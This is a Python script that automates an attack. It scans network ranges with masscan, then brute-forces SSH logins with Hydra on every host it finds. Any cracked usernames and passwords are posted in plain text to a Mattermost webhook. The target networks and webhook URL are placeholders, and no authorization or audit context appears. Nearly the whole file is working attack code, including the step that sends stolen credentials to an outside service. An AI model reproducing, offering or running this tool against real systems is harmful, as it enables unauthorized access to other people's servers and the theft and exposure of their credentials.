import os
import subprocess
import requests

# Mattermost webhook URL
MATTERMOST_WEBHOOK_URL = "Mattermost WebHook"

# List of networks and port ranges for Masscan
NETWORKS = [

    {"network": "x.x.x.x/x", "ports": "22,80,443"},
    {"network": "x.x.x.x/x", "ports": "22,80,443"},
    {"network": "x.x.x.x/x", "ports": "22,80,443"}

]

# Function to scan network using Masscan
def scan_network(network, ports):
    command = f"sudo masscan {network} -p{ports} --rate 10000"
    result = subprocess.run(command.split(), capture_output=True, text=True)
    return result.stdout

# Function to extract IP addresses from Masscan output
def extract_ips(scan_results):
    found_ips = []
    for line in scan_results.splitlines():
        if "Discovered open port" in line:
            parts = line.split()
            ip = parts[-1]  # The IP is the last part of the line
            found_ips.append(ip)
    return found_ips

# Function to send Mattermost alert
def send_mattermost_alert(ip, service, username, password):
    payload = {
        "text": f"Successful login on {ip} via {service}.\nUsername: {username}\nPassword: {password}"
    }
    requests.post(MATTERMOST_WEBHOOK_URL, json=payload)

# Function to perform brute-force using Hydra and parse the results
def hydra_bruteforce(ip, usernames_file, passwords_file):
    command = f"hydra -L {usernames_file} -P {passwords_file} ssh://{ip} -t 4"
    result = subprocess.run(command.split(), capture_output=True, text=True)
    
    # Parse Hydra output for successful logins
    for line in result.stdout.splitlines():
        # Print the line for debugging to see the format
        print(f"Hydra output line: {line}")
        
        # Look for lines that contain host, login, and password information
        if "host:" in line and "login:" in line and "password:" in line:
            parts = line.split()

            # Ensure there are enough parts before accessing them
            if len(parts) >= 7:
                ip = parts[2]  # Extract the IP address (after "host:")
                username = parts[4]  # Extract the username (after "login:")
                password = parts[6]  # Extract the password (after "password:")

                # Send successful login alert
                print(f"Successful SSH login on {ip} with {username}/{password}")
                send_mattermost_alert(ip, "SSH", username, password)
                return True  # Stop further brute-forcing once a login is successful
            else:
                # If parts are missing, print for debugging
                print(f"Unexpected line format: {line}")

    print(f"No successful logins on {ip}")
    return False

# Main function to run the script
def main():
    # Iterate over all networks to scan
    for network_data in NETWORKS:
        network = network_data["network"]
        ports = network_data["ports"]
        
        print(f"Scanning network {network}...")
        scan_results = scan_network(network, ports)

        # Extract found IP addresses from the scan results
        found_ips = extract_ips(scan_results)

        if not found_ips:
            print(f"No IPs found on network {network}")
            continue

        # Perform brute-force attacks on found IPs using Hydra
        for ip in found_ips:
            print(f"Starting brute-force on {ip}...")
            hydra_bruteforce(ip, 'usernames.txt', 'passwords.txt')

if __name__ == "__main__":
    main()
